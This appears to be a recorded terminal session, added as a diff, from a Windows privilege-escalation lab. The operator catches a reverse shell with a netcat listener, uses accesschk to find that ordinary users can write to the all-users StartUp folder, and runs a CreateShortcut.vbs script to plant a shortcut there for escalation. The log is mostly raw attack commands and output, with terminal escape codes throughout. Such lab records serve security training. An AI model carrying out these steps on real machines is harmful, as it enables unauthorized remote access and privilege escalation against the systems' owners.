@@ -1,0 +1,33 @@
+Script started on 2025-03-16 16:38:06+03:00 [COMMAND="rlwrap nc -lvnp 6047" TERM="xterm-256color" TTY="/dev/pts/0" COLUMNS="104" LINES="27"]
+[?2004hlistening on [any] 6047 ...
+[K[K[?2004h        [K[?2004lconnect to [172.21.1.38] from (UNKNOWN) [172.21.0.1] 13577
+[K[?2004h[?2004lMicrosoft Windows [Version 10.0.17763.737][K[?2004hMicrosoft Windows [Version 10.0.17763.737][?2004l[KMicrosoft Windows [Version 10.0.17763.737]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Users\user>[K[?2004hC:\Users\user>[7mC:\PrivEsc\accesschk.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Progr[27m[7ma[27m[7mms\StartUp"[27m[A[C[C[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K
+[K[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004hC:\PrivEsc\accesschk.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
+[KC:\PrivEsc\accesschk.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
+[K
+AccessChk v4.02 - Check access of files, keys, objects, processes or services
+Copyright (C) 2006-2007 Mark Russinovich
+Sysinternals - www.sysinternals.com
+
+C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp
+  Medium Mandatory Level (Default) [No-Write-Up]
+  RW BUILTIN\Users
+  RW WIN-QBA94KB3IOF\Administrator
+  RW WIN-QBA94KB3IOF\admin
+  RW NT AUTHORITY\SYSTEM
+  RW BUILTIN\Administrators
+  R  Everyone
+[K
+C:\Users\user>[KC:\Users\user>[K[?2004hC:\Users\user>[7mcscript C:\PrivEsc\CreateShortcut.vbs[27m[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcscript C:\PrivEsc\CreateShortcut.vbs
+[Kcscript C:\PrivEsc\CreateShortcut.vbs
+[KMicrosoft (R) Windows Script Host Version 5.812
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+
+C:\Users\user>[KC:\Users\user>[K[?2004hC:\Users\user>r[Kexit[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hexit
+[Kexit
+[?2004l
+Script done on 2025-03-16 16:45:27+03:00 [COMMAND_EXIT_CODE="0"]
